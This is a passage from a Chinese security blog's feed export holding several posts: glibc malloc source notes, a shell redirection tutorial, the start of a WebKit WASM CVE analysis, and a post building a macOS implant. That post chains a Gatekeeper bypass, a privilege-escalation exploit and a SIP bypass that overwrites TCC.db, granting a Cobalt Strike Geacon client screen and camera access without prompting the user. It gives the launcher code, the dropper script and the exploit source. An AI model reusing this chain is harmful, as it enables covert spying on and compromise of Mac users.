(old_size != <span class="hljs-number">0</span>)<br>                    &#123;<br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                         Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                         multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                         enough space in old_top to do this.</span><br><span class="hljs-comment">                       */</span><br>                      old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                      set_head (old_top, old_size | PREV_INUSE);<br><br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                         Note that the following assignments completely overwrite</span><br><span class="hljs-comment">                         old_top when old_size was previously MINSIZE.  This is</span><br><span class="hljs-comment">                         intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="hljs-comment">                         lost.</span><br><span class="hljs-comment">                       */</span><br>      set_head (chunk_at_offset (old_top, old_size),<br>(<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>      set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>(<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br><br>                      <span class="hljs-comment">/* If possible, release the rest. */</span><br>                      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                        &#123;<br>                          _int_free (av, old_top, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-comment">/* if (av !=  &amp;main_arena) */</span><br></code></pre></td></tr></table></figure><p>最后做一些关于arena的设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))<br>  av-&gt;max_system_mem = av-&gt;system_mem;<br>check_malloc_state (av);<br><br><span class="hljs-comment">/* finally, do the allocation */</span><br>p = av-&gt;top;<br>size = chunksize (p);<br><br><span class="hljs-comment">/* check that one of the above allocation paths succeeded */</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>  &#123;<br>    remainder_size = size - nb;<br>    remainder = chunk_at_offset (p, nb);<br>    av-&gt;top = remainder;<br>    set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head (remainder, remainder_size | PREV_INUSE);<br>    check_malloced_chunk (av, p, nb);<br>    <span class="hljs-keyword">return</span> chunk2mem (p);<br>  &#125;<br><br><span class="hljs-comment">/* catch all failure paths */</span><br>__set_errno (ENOMEM);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>geacon_macos</title>
    <link href="/2023/11/25/geacon-macos/"/>
    <url>/2023/11/25/geacon-macos/</url>
    
    <content type="html"><![CDATA[<h1 id="三个CVE"><a href="#三个CVE" class="headerlink" title="三个CVE"></a>三个CVE</h1><ul><li><p>CVE-2022-22616<br>绕过GateKeeper<br>修复版本macOS12.3</p><blockquote></blockquote><pre><code class="hljs">mkdir -p poc.app/Contents/MacOSecho &quot;#!/bin/bash&quot; &gt; poc.app/Contents/MacOS/pocecho &quot;open -a Calculator&quot; &gt;&gt; poc.app/Contents/MacOS/pocchmod +x poc.app/Contents/MacOS/poczip -r poc.app.zip poc.appgzip -c poc.app.zip &gt; poc.app.zip.gz</code></pre></li><li><p>CVE-2022-22639<br>提权<br>修复版本macOS12.3</p><blockquote></blockquote><pre><code class="hljs">clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd解压 InstallAssistant.gz 到tmp文件夹run /tmp/exploit</code></pre><p>​    </p></li><li><p>CVE-2022-26712<br>绕过SIP<br>修复版本macOS12.4</p><blockquote></blockquote><pre><code class="hljs">sudo /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/shove -X /tmp/crafted.db /Library/Application\ Support/com.apple.TCC/TCC.db</code></pre></li></ul><h1 id="一-打包过程"><a href="#一-打包过程" class="headerlink" title="(一)打包过程"></a>(一)打包过程</h1><ol><li>首先是先将geacoon和相关代码进行编译</li><li>准备提权</li><li>准备替换TCC.db</li><li>将上面的步骤封装成一个app，并准备绕过gatekeeper</li></ol><ul><li>下面是整个App的构成，最终的效果是实现Geacon上线，并且能够正常执行Geacon中的相关功能；<br>我们的最终目的是想通过App让我们的Geacon上线，并且正常使用相关功能。所以在Geacon上线之前需要做一些前置工作（比如提权后绕过SIP操作TCC.db，先为我们的Geacon增加一下所需的权限），然后再启动Geacon。</li><li>主要构成</li><li>path<br>由于App可能会被放置到系统的各个位置，为了后面cp程序的正常执行，需要获取App当前所在的位置。因此，path程序做的事情就是获取当前App的位置，并且记录下来。</li><li>cp<br>该程序首先将提权程序elev执行所需的文件和环境构造好，然后启动提权程序</li><li>elev<br>该程序主要作用是以root权限执行一些命令，比如操作TCC.db的shove命令。效果就是在有root的权限基础上，进一步借助root权限执行shove，将系统原有的TCC.db替换掉，新的TCC.db中有我们Geacon程序所需的权限。</li><li>client<br>该程序就是Geacon程序，其中有截图、摄像头拍照功能，在截取屏幕内容和完成拍摄后是需要将图片回传至Cobalt Strike的。截图和调取摄像头都需要用户授予权限后才能使用，为了进一步隐蔽，上面通过借助提权程序和shove来为我们的Geacon程序提供预先设置好的权限。在前置工作完成的基础上，Geacon的功能是能够正常使用的，此时不会弹窗提示用户需要授权。这样Geacon程序是能够藏匿于目标系统中的。</li></ul><p><img src="/2023/11/25/geacon-macos/geacon_app_structure.png" alt="App构成"></p><p>下面这个结构就是自己添加的两个功能，一个是调取摄像头拍照，另一个是用于图片回传；</p><ul><li>关于图片回传的背景<br>之前Geacon里面的功能是面向Windows开发的，其中有些函数的用法并不适用MacOS，比如管道。在Windows下可以不用去了解图片的传输格式，但是在Mac中由于之前的功能不适用所以会导致传输图片失败，这样就必须去了解图片的发送格式，然后自己再手动构造一个包就行，这个用于构造传输图片的包的功能实现在ding模块里。</li></ul><p>这个源于一开始要实现截取屏幕内容并且回传，最初能截图但是图片却不能传回来，所以才进行了一个图片格式包的逆向。</p><ul><li>调取Macbook摄像头进行拍照<br>有了上面传输图片的基本功能后，可以进一步拓展。<br>当我们能调取摄像头进行拍照后，将其存为图片，继而可以将图片回传。</li></ul><p><img src="/2023/11/25/geacon-macos/geacon_func_structure.png" alt="功能构成"></p><h1 id="二-总体的大致实现流程"><a href="#二-总体的大致实现流程" class="headerlink" title="(二)总体的大致实现流程"></a>(二)总体的大致实现流程</h1><h2 id="App的可执行文件"><a href="#App的可执行文件" class="headerlink" title="App的可执行文件"></a>App的可执行文件</h2><p>下面代码做的事情：</p><ul><li>一个是将当前App路径记录下来，写进path文件里；</li><li>然后执行cp脚本</li><li>最后执行client程序</li></ul><blockquote><p>#import &lt;Foundation&#x2F;Foundation.h&gt;<br>    int main(int argc, const char * argv[]){</p></blockquote><pre><code class="hljs">    NSBundle *myBundle = [NSBundle mainBundle];    NSString *str = [myBundle bundlePath];//app path    NSString *path2file = [str stringByAppendingString:@&quot;/Contents/Resources/path&quot;];//write path to file    [str writeToFile:path2file atomically:TRUE encoding:NSUTF8StringEncoding error:nil];    NSString *str1 = [str stringByAppendingString:@&quot;/Contents/Resources/cp&quot;];//bash script path    NSLog(@&quot;%@&quot;,str);    NSTask *task = [[NSTask alloc] init];    NSArray *arguments = @[str];    [task setLaunchPath:str1];    [task setArguments:arguments];    [task launch];//run script    [task waitUntilExit];        NSTask *client = [[NSTask alloc] init];    [client setLaunchPath:@&quot;/tmp/client&quot;];    [client launch];    return 0;&#125;</code></pre><h2 id="cp脚本，用来准备执行提权程序"><a href="#cp脚本，用来准备执行提权程序" class="headerlink" title="cp脚本，用来准备执行提权程序"></a>cp脚本，用来准备执行提权程序</h2><p>下面的脚本是用来执行提权程序</p><blockquote></blockquote><pre><code class="hljs">#!/bin/bashpath1=$1path2=&quot;/Contents/Resources/InstallAssistant.gz&quot;path3=&quot;/Contents/Resources/elev&quot;path4=&quot;/Contents/Resources/Applications&quot;path5=&quot;/Contents/Resources/crafted.db&quot;path7=&quot;/Contents/Resources/client&quot;path=$&#123;path1&#125;$&#123;path2&#125;echo $&#123;path&#125;tar -xzvf $&#123;path&#125; -C $&#123;path1&#125;/Contents/Resources/echo &quot;decompress over&quot;mv -f $&#123;path1&#125;$&#123;path4&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path3&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path5&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path7&#125; /tmp/echo &quot;mv over&quot;/tmp/elev &amp;sleep 1</code></pre><h2 id="提权程序，可以将需要提权的代码执行放到这里执行"><a href="#提权程序，可以将需要提权的代码执行放到这里执行" class="headerlink" title="提权程序，可以将需要提权的代码执行放到这里执行"></a>提权程序，可以将需要提权的代码执行放到这里执行</h2><ul><li>提权程序的核心是在一个更新包的可执行程序中，可以是一个脚本；</li><li>下面做的是需要将执行的指令放到更新包的可执行程序中，以脚本的形式运行；</li><li>osinstallersetupd程序是以root的身份运行的，所以其中的指令也是以root的形式运行；</li><li>将需要root权限的指令写进去即可，比如下面是覆盖TCC.db</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">///  clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd</span><br><br><span class="hljs-meta">#import <span class="hljs-string">&lt;Foundation/Foundation.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@protocol</span> <span class="hljs-title">SUHelperDProtocol</span></span><br><span class="hljs-comment">// some protocol methods</span><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">SUHelperProxy</span> : <span class="hljs-title">NSObject</span> &lt;<span class="hljs-title">SUHelperDProtocol</span>&gt;</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _suhelperd_port;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _client_port;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> _currentRights;<br>    <span class="hljs-built_in">NSObject</span>&lt;OS_dispatch_queue&gt; *_q;<br>    <span class="hljs-built_in">NSObject</span>&lt;OS_dispatch_source&gt; *clientPortDeadChecker;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> _recentRights;<br>&#125;<br><br>+ (<span class="hljs-type">id</span>)sharedHelperProxy;<br><span class="hljs-keyword">@property</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> recentRights; <span class="hljs-comment">// @synthesize recentRights=_recentRights;</span><br>- (<span class="hljs-type">void</span>)authorizeWithEmptyAuthorizationForRights:(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)arg1;<br>- (<span class="hljs-type">BOOL</span>) prepareInstallAssistantWithPath:(<span class="hljs-built_in">NSString</span> *)arg1;<br>- (<span class="hljs-type">id</span>) installAssistantPreparationStatus;<br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-type">int</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span> * argv[]) &#123;<br><br>    <span class="hljs-built_in">NSString</span> *modifyFile = <span class="hljs-string">@&quot;/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd&quot;</span>;<br>    <span class="hljs-built_in">NSString</span> *installAppPath = <span class="hljs-string">@&quot;/tmp/Applications/Install macOS Monterey beta.app&quot;</span>;<br>    <span class="hljs-built_in">NSString</span> *instr1 = <span class="hljs-string">@&quot;#!/bin/bash\nwhoami &amp;&gt; /Library/test_root\n&quot;</span>;<span class="hljs-comment">//Test root</span><br>    <span class="hljs-built_in">NSString</span> *instr2 = <span class="hljs-string">@&quot;/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/shove -X /tmp/crafted.db /Library/Application\\ Support/com.apple.TCC/TCC.db\n&quot;</span>;<span class="hljs-comment">//change tcc.db of system</span><br>    <br>    <span class="hljs-built_in">NSString</span> *instr = [instr1 stringByAppendingString:instr2];<span class="hljs-comment">//instr1 + instr2</span><br>    [instr writeToFile:modifyFile atomically:<span class="hljs-literal">TRUE</span> encoding:<span class="hljs-built_in">NSUTF8StringEncoding</span> error:<span class="hljs-literal">nil</span>];<br>    <br>    <span class="hljs-comment">// fire the hole</span><br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;all ready, we can go go go!&quot;</span>);<br>    <br>    SUHelperProxy *helper = [SUHelperProxy sharedHelperProxy];<br>    [helper authorizeWithEmptyAuthorizationForRights:<span class="hljs-number">4</span>];<br>    <br>    <span class="hljs-type">id</span> status = [helper installAssistantPreparationStatus];<br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;installAssistantPreparationStatus:%@&quot;</span>, status);<br>    <span class="hljs-comment">// will hang inside, waiting for XPC response</span><br>    [helper prepareInstallAssistantWithPath:installAppPath];<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="client程序就是我们编译好的geacon"><a href="#client程序就是我们编译好的geacon" class="headerlink" title="client程序就是我们编译好的geacon"></a>client程序就是我们编译好的geacon</h2><ul><li>前面做的工作是为了client能够正常运行</li><li>当能够正常运行client时，该mac机器就能够正常上线</li><li>这部分主要就是除了geacon的基本功能，还额外实现了截图和打开摄像头拍照，并且可以将图片回传至CobaltStrike上面。</li></ul><h1 id="三-geacon和自拓展功能"><a href="#三-geacon和自拓展功能" class="headerlink" title="(三)geacon和自拓展功能"></a>(三)geacon和自拓展功能</h1><h2 id="geacon实现"><a href="#geacon实现" class="headerlink" title="geacon实现"></a>geacon实现</h2><p>这部分待补【目前放在网盘里】</p><h2 id="截图功能"><a href="#截图功能" class="headerlink" title="截图功能"></a>截图功能</h2><p>这部分工作要依赖上面提到的提权和绕过SIP。</p><ul><li><p>提权：是为了以root用户的身份去执行一些命令</p></li><li><p>绕过SIP：上面提到在特定系统版本范围内，shove命令可以直接操作TCC.db，但是这是需要root权限，所以配合提权就可以替换掉TCC.db文件</p></li><li><p>TCC.db：在Mac中应用可能会需要各种权限，在使用这些权限之前它需要先向系统申请授予权限，得到权限后才能进一步使用对应的功能。而记录每个程序权限控制就记录在TCC.db中</p></li></ul><p>这里我们是直接使用Mac自带的截图命令来截取当前的屏幕内容，如果程序没有被授予截屏权限将不能截取到屏幕的内容，而仅能截取到屏幕的背景，所以我们想要截取屏幕的内容需要先授予截屏权限。授予权限我们是通过更改TCC.db中的数据来更改权限的，是借助提权和绕过SIP两个漏洞来进行的，下面的摄像头功能同样是如此。</p><h2 id="关于图片回传"><a href="#关于图片回传" class="headerlink" title="关于图片回传"></a>关于图片回传</h2><p>这部分是将图片回传至CobaltStrike上，之前在Windows端的图片回传是通过管道获取数据的，在Mac上如果回传的格式不对CobaltStrike是无法正确解析的，所以下面Mac上的图片回传是通过调试Windows端的geacon来进一步获取回传的格式。</p><p>回传的格式如下:<br>图片内容长度(4Byte) + 图片内容 + id(4Byte) + 窗口名字的长度(4Byte) + 窗口名字 + 用户名字长度(4Byte) + 用户名字</p><p>将图片打包成正确的格式，我实现在ding.mm文件中</p><h2 id="摄像头拍照"><a href="#摄像头拍照" class="headerlink" title="摄像头拍照"></a>摄像头拍照</h2><p>摄像头拍照功能是通过包含bmain.h文件来调用的，打开摄像头并拍照放在一个单独的模块进行实现的。</p><p>该功能通过三个模块实现的：<br>VideoCapturer<br>MyDelegate<br>bmain</p>]]></content>
    
    
    <categories>
      
      <category>MacOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重定向</title>
    <link href="/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <url>/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>准备好好看下重定向得从下面这条语句说起：<br>-strace命令用于监控和记录程序执行时的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">strace ./cast 2&gt;&amp;1 | grep -E &#x27;^write&#x27; | wc -l<br></code></pre></td></tr></table></figure><ul><li>   重定向描述符<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从输入和输出的角度看，<span class="hljs-built_in">cat</span>命令的输出的内容是其输入内容的直接复制</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span>命令后面可以跟文件名字来读取文件的内容并且输出，如果<span class="hljs-built_in">cat</span>后面没有文件名字则从标准输入中进行读取内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下面是从标准输入中读取内容，然后重定向输出到文件中，最后结束按ctrl + d</span><br>cat &gt; temp.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt; 是输入重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> &lt; filename，这样<span class="hljs-built_in">command</span>是从文件中读取而不是从标准输入读取</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面这条指令和 <span class="hljs-built_in">cat</span> filename.txt效果一样</span><br>cat &lt; filename.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;是输出重定向，指的是stdout重定向</span><br>ls &gt; test.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2&gt; 这是标准错误重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面将cast程序的错误输出保存到文件中</span><br>./cast 2&gt; errorOutput.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&amp;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&amp;这是重定向操作符，将一个文件描述符重定向至另一个文件描述符</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面是将cast程序的错误输出和正常输出都输出到标准输出中，然后再将内容输出到文件中</span><br>./cast 2&gt;&amp;1 &gt; allOutput.txt<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"> # </span><span class="language-bash">| 管道符</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">管道符是将前面一个命令的标准输出作为后面一个命令的标准输入</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">cmd1 | cmd2</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;&lt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">输入重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;&lt; <span class="hljs-string">identifier, 这个效果就是创建一个Here Document，允许定义一个多行字符串，并且以identifier</span>为结束标志</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如 &lt;&lt; <span class="hljs-string">eof，这允许我们输入一个多行字符串最后以eof</span>为结束标志</span><br>&lt;&lt;eof<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">123</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">456</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">789</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">eof</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下面是结合<span class="hljs-built_in">cat</span>、&gt;、&lt;&lt;来实现从标准输入中读取，并且保存到文件中</span><br>cat &gt; temp.txt &lt;&lt;eof<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&gt;输出重定向是用于追加内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接向一个文件尾部添加内容</span><br>echo &quot;sss&quot; &gt;&gt; temp.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接从标准输入中读取内容并且追加到文件中</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt; temp.txt &lt;&lt;<span class="hljs-string">eof</span></span><br><br><br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WASM-整数溢出</title>
    <link href="/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-30734"><a href="#CVE-2021-30734" class="headerlink" title="CVE-2021-30734"></a>CVE-2021-30734</h1><h1 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h1><h2 id="wasm的执行过程"><a href="#wasm的执行过程" class="headerlink" title="wasm的执行过程"></a>wasm的执行过程</h2><p>JavaScriptCore 运行传统的 JavaScript 代码时，它利用了四层执行，从而不断优化代码。当引擎确定某个函数是 “热” 函数时（如果经常调用该函数，则可能会发生这种情况），或者包含迭代足够次数的循环，则会将其传递到下一层，进行更积极的优化。</p><p>wasm 执行管道采用类似的方法，分为三层。解析 WebAssembly 模块会生成字节码，供解释器使用：wasm llint（低级解释器）。在 llint 之后，有两个 JIT（即时）编译器：BBQ（快速构建字节码）和 OMG（优化的机器代码生成器）。</p><p><img src="/2023/05/06/WASM-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20240915130301870.png"></p><p>对于 wasm 模块代码部分中的每个函数，该函数都会被解析并在一次传递中生成字节码。解析器逻辑是通用的，并在负责代码生成的上下文对象上进行模板化。对于 llint，这将是一个生成字节码的 LLIntGenerator 对象。</p><h2 id="wasm的解析"><a href="#wasm的解析" class="headerlink" title="wasm的解析"></a>wasm的解析</h2><h3 id="函数序言"><a href="#函数序言" class="headerlink" title="函数序言"></a>函数序言</h3><p>函数序言（Function Prologue） 是在函数开始执行时所执行的一段汇编代码，用来为函数的执行环境进行初始化。它主要负责：</p><p>保存调用者环境：保存调用者的寄存器状态（比如返回地址、基址指针等），以便在函数执行完后可以恢复到调用者的状态。</p><p>设置栈帧：为函数的局部变量和临时变量在栈上分配空间，调整栈指针（sp）的位置，建立新的栈帧。</p><p>管理寄存器：保存必要的寄存器，以防止它们在函数调用过程中被覆盖。</p><p>初始化环境：如果函数需要使用一些全局或静态环境（比如某些全局状态或特定上下文），函数序言也会负责进行初始化。</p><p>函数序言是编译器在编译过程中自动生成的，并且每个函数都会有自己特定的序言，取决于函数需要使用多少局部变量、传递多少参数，以及调用约定（calling convention）等因素。</p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>下面第14行是构造函数初始化栈的大小，特别注意的是在高版本的WebKit中m_stackSize初始是为<code>numberOfLLIntCalleeSaveRegisters + numberOfLLIntInternalRegisters</code>，CVE所在的WebKit版本被初始化为<code>numberOfLLIntCalleeSaveRegisters</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// WasmCallingConvention.h</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfLLIntCalleeSaveRegisters = <span class="hljs-number">2</span>;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfIPIntCalleeSaveRegisters = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-type">unsigned</span> numberOfLLIntInternalRegisters = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// WasmLLIntGenerator.cpp</span><br><span class="hljs-comment">// 构造函数中初始化m_stackSize为2</span><br>LLIntGenerator::<span class="hljs-built_in">LLIntGenerator</span>(<span class="hljs-type">const</span> ModuleInformation&amp; info, <span class="hljs-type">unsigned</span> functionIndex, <span class="hljs-type">const</span> Signature&amp;)<br>    : <span class="hljs-built_in">BytecodeGeneratorBase</span>(<span class="hljs-built_in">makeUnique</span>&lt;FunctionCodeBlock&gt;(functionIndex), <span class="hljs-number">0</span>)<br>    , <span class="hljs-built_in">m_info</span>(info)<br>    , <span class="hljs-built_in">m_functionIndex</span>(functionIndex)<br>&#123;<br>    &#123;<br>        <span class="hljs-keyword">auto</span>&amp; threadSpecific = <span class="hljs-built_in">threadSpecificBuffer</span>();<br>        Buffer buffer = <span class="hljs-built_in">WTFMove</span>(*threadSpecific);<br>        *threadSpecific = <span class="hljs-built_in">Buffer</span>();<br>        m_writer.<span class="hljs-built_in">setInstructionBuffer</span>(<span class="hljs-built_in">WTFMove</span>(buffer));<br>    &#125;<br><br>    m_codeBlock-&gt;m_numVars = numberOfLLIntCalleeSaveRegisters;<br>    m_stackSize = numberOfLLIntCalleeSaveRegisters;<br>    m_maxStackSize = numberOfLLIntCalleeSaveRegisters;<br><br>    WasmEnter::<span 